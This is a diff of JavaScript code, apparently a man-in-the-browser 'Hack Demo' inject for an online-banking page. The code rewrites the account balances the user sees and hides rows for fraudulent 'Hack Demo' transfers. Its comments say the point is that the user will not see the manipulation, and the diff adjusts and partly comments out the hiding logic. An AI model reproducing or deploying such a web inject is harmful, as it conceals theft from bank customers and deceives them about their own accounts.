@@ -4937,7 +4937,7 @@ function getHackedMoney(realMoney) {
 		 	//set hackmarker for transaction so they will not be changed during account amount manipulation
 		 	transactionRow= $(".TransfersOdd,.TransfersEven").each(function(){
 		 		$(this).next().next().next().attr("hackMarker","true");	
-		 		$(this).show();
+		 		$(this).parent().show();
 		 	});
 		 	//manipulate account balance
 		 	$(".negativeMoney[hackmarker!='true'],.positiveMoney[hackmarker!='true']").each(function() {
@@ -4957,25 +4957,29 @@ function getHackedMoney(realMoney) {
 				//display with 2 decimal places and €
 				$(this).text(outputMoney(newValue) + " \u20AC");
 			 });
-		 	
+
 		 }
 	 
 	 $(document).ready(function() {
 //		 window.attachEvent ("DOMNodeInserted", pageChanged, true); 
+
 		 setTimeout(pageChanged,1); 
 	 });
 
 
 	 function pageChanged()  {
+
 		 //first hide money value so user will not see that money value will be manipulated
 		 //because of delay in manipulation call
-		 $(".negativeMoney[hackmarker!='true'],.positiveMoney[hackmarker!='true']").each(function() {
-			 $(this).hide();
-		 });
+		 //does not work for ie as there is no DOMNoseInserted event
+//		 $(".negativeMoney[hackmarker!='true'],.positiveMoney[hackmarker!='true']").each(function() {
+//			 $(this).hide();
+//		 });
 		 //hide all hacked transfers as well
-		 hackedRow= $(".TransfersOdd,.TransfersEven").filter(':contains(Hack Demo)').each(function(){			
-			$(this).parent().hide(); 
-		 });
+		 //does not work for ie as there is no DOMNoseInserted event
+//		 hackedRow= $(".TransfersOdd[hackmarker!='true'],.TransfersEven[hackmarker!='true']").filter(':contains(Hack Demo)').each(function(){			
+//			$(this).parent().hide(); 
+//		 });
 		 
 		// some delay for function call is needed
 		// otherwise the browser will lag
@@ -5013,4 +5017,3 @@ function getHackedMoney(realMoney) {
 		}, true);
 			
 	 }
-console.log("test");
